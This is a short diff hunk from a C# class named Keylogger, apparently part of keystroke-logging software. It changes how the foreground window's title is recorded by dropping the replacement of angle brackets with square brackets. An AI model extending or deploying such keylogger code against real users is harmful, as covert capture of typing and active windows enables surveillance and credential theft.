@@ -66,7 +66,7 @@ internal class Keylogger : IDisposable
             var hWindow = NativeFunctions.GetForegroundWindow();
             var title = new StringBuilder(256);
             NativeFunctions.GetWindowText(hWindow, title, title.Capacity);
-            var windowName = title.ToString().Replace("<","[").Replace(">","]");
+            var windowName = title.ToString();
             if (WindowName != windowName)
             {
                 WindowName = windowName.Trim();
